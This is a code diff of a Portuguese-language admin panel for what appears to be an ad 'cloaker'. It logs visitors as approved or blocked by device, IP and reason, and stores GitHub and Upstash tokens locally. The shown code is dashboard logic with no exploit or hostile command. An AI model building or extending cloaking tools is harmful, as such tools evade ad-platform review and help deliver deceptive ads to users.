+    const rs  = log.rs || log.reason     || '—';
+    const dst = log.dst || log.destination || '';
+    return { ts, dv, ac, rs, dst, cid: log.cid || '', plt: log.plt || '', ip: log.ip || '', ua: log.ua || '' };
+}
+
+// ════════════════════════════════════════════════════════════
+//  Logs
+// ════════════════════════════════════════════════════════════
+async function loadLogs() {
+    const btn = document.getElementById('btnFetchLogs');
+    btn.disabled = true; btn.textContent = 'Carregando...';
+    hideAllMessages();
+    try {
+        const logs = await fetchAllLogs(200);
+        window._allLogs = logs.map(normLog);
+        populateCampaignFilter();
+        applyLogFilters();
+    } catch (e) {
+        showMessage('logs-msg', e.message, 'error');
+    } finally {
+        btn.disabled = false; btn.textContent = '↻ Atualizar';
     }
+}
 
-    function copyScript() {
-        const code = document.getElementById('scriptOutput').textContent;
-        if (code.includes('// Preencha e salve')) return;
+function populateCampaignFilter() {
+    const sel  = document.getElementById('log-campaign-filter');
+    const prev = sel.value;
+    while (sel.options.length > 1) sel.remove(1);
+    getCampaigns().forEach(c => {
+        const o = document.createElement('option');
+        o.value = c.id; o.textContent = c.name;
+        sel.appendChild(o);
+    });
+    if ([...sel.options].some(o => o.value === prev)) sel.value = prev;
+}
 
-        navigator.clipboard.writeText(code).then(() => {
-            showMessage('script-msg', 'Script copiado!', 'success');
-            setTimeout(() => hideAllMessages(), 3000);
-        }).catch(err => {
-            console.error('Falha ao copiar:', err);
-            showMessage('script-msg', 'Erro ao copiar.', 'error');
+function applyLogFilters() {
+    const logs   = window._allLogs || [];
+    const date   = document.getElementById('log-date-filter').value;
+    const camp   = document.getElementById('log-campaign-filter').value;
+    const action = document.getElementById('log-action-filter').value;
+
+    const filtered = logs.filter(l => {
+        if (date && l.ts && l.ts.slice(0, 10) !== date)  return false;
+        if (camp !== 'all' && l.cid !== camp)             return false;
+        if (action !== 'all' && l.ac !== action)          return false;
+        return true;
+    });
+
+    renderLogs(filtered);
+    document.getElementById('logs-count').textContent =
+        `${filtered.length} de ${logs.length} registro(s)`;
+}
+
+function renderLogs(logs) {
+    const tbody   = document.getElementById('logs-tbody');
+    const campMap = Object.fromEntries(getCampaigns().map(c => [c.id, c.name]));
+
+    if (!logs.length) {
+        tbody.innerHTML = '<tr><td colspan="7" class="logs-empty">Nenhum log encontrado.</td></tr>';
+        return;
+    }
+    tbody.innerHTML = logs.map(l => {
+        const dt   = l.ts ? new Date(l.ts).toLocaleString('pt-BR', { dateStyle: 'short', timeStyle: 'medium' }) : '—';
+        const dv   = l.dv === 'mobile' ? '📱 mobile' : '🖥️ desktop';
+        const badge = l.ac === 'approved'
+            ? '<span class="badge badge-green">✔ aprovado</span>'
+            : '<span class="badge badge-red">✖ bloqueado</span>';
+        const dest = l.dst && l.dst !== 'blocked'
+            ? `<span class="destination-cell" title="${escHtml(l.dst)}">${escHtml(l.dst)}</span>`
+            : '<span style="color:var(--text-secondary)">—</span>';
+        const camp = l.cid && campMap[l.cid]
+            ? `<span style="font-size:0.78rem;color:var(--text-secondary)">${escHtml(campMap[l.cid])}</span>`
+            : '<span style="color:var(--text-secondary);font-size:0.78rem">—</span>';
+        return `<tr>
+            <td>${dt}</td>
+            <td>${camp}</td>
+            <td>${dv}</td>
+            <td>${escHtml(l.ip)}</td>
+            <td>${badge}</td>
+            <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;">${escHtml(l.rs)}</td>
+            <td>${dest}</td>
+        </tr>`;
+    }).join('');
+}
+
+async function clearLogs() {
+    if (!confirm('Apagar todos os logs?')) return;
+    const btn = document.getElementById('btnClearLogs');
+    btn.disabled = true;
+    try {
+        const { url, token } = getUpstashCreds();
+        const res = await fetch(`${url}/del/cloaker_logs`, {
+            method: 'POST', headers: { Authorization: `Bearer ${token}` }
         });
-    }
+        if (!res.ok) throw new Error(`Erro HTTP ${res.status}`);
+        window._allLogs = [];
+        renderLogs([]);
+        document.getElementById('logs-count').textContent = '0 registro(s)';
+        showMessage('logs-msg', 'Logs apagados!', 'success');
+        setTimeout(() => hideAllMessages(), 3000);
+    } catch (e) {
+        showMessage('logs-msg', e.message, 'error');
+    } finally { btn.disabled = false; }
+}
 
-    function checkUrlProtocol() {
-        const val = document.getElementById('newMobileLink').value.trim();
-        const warning = document.getElementById('url-warning');
-        if (val.length > 0 && !/^https?:\/\//i.test(val)) {
-            warning.style.display = 'block';
-        } else {
-            warning.style.display = 'none';
-        }
-    }
+// ════════════════════════════════════════════════════════════
+//  Configurações
+// ════════════════════════════════════════════════════════════
+function saveUpstashConfig() {
+    const url   = document.getElementById('upstash-url').value.trim().replace(/\/$/, '');
+    const token = document.getElementById('upstash-token').value.trim();
+    if (!url || !token) { showMessage('config-msg', 'Preencha a URL e o Token.', 'error'); return; }
+    localStorage.setItem('upstash_url',   url);
+    localStorage.setItem('upstash_token', token);
+    showMessage('config-msg', 'Credenciais Upstash salvas!', 'success');
+    setTimeout(() => hideAllMessages(), 3000);
+}
+
+function saveConfig(e) {
+    e.preventDefault();
+    const token     = document.getElementById('gh-token').value.trim();
+    const repo      = document.getElementById('gh-repo').value.trim();
+    const branch    = document.getElementById('gh-branch').value.trim()  || 'main';
+    const path      = document.getElementById('gh-path').value.trim()    || 'api/filtrar.mjs';
+    const vercelUrl = document.getElementById('vercel-url').value.trim().replace(/\/$/, '');
+    if (!token || !repo) { showMessage('config-msg', 'Preencha o Token e o Repositório.', 'error'); return; }
+    localStorage.setItem('gh_token',   token);
+    localStorage.setItem('gh_repo',    repo);
+    localStorage.setItem('gh_branch',  branch);
+    localStorage.setItem('gh_path',    path);
+    localStorage.setItem('vercel_url', vercelUrl);
+    showMessage('config-msg', 'Configurações salvas!', 'success');
+    setTimeout(() => hideAllMessages(), 3000);
+}
+
+// ════════════════════════════════════════════════════════════
+//  Navegação
+// ════════════════════════════════════════════════════════════
+function activateTab(tabId) {
+    document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    const btn = document.querySelector(`.nav-item[data-tab="${tabId}"]`);
+    if (btn) btn.classList.add('active');
+    const tab = document.getElementById(`tab-${tabId}`);
+    if (tab) tab.classList.add('active');
+}
+
+function switchTab(tabId) {
+    activateTab(tabId);
+    hideAllMessages();
+    if (tabId === 'home') loadHome();
+    if (tabId === 'logs') { populateCampaignFilter(); if (window._allLogs) applyLogFilters(); }
+}
+
+// ════════════════════════════════════════════════════════════
+//  Init
+// ════════════════════════════════════════════════════════════
+window.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('upstash-url').value   = localStorage.getItem('upstash_url')   || '';
+    document.getElementById('upstash-token').value = localStorage.getItem('upstash_token') || '';
+    document.getElementById('gh-token').value      = localStorage.getItem('gh_token')      || '';
+    document.getElementById('gh-repo').value       = localStorage.getItem('gh_repo')       || '';
+    document.getElementById('gh-branch').value     = localStorage.getItem('gh_branch')     || 'main';
+    document.getElementById('gh-path').value       = localStorage.getItem('gh_path')       || 'api/filtrar.mjs';
+    document.getElementById('vercel-url').value    = localStorage.getItem('vercel_url')    || '';
+    loadHome();
+});
 </script>
-
 </body>
 </html>
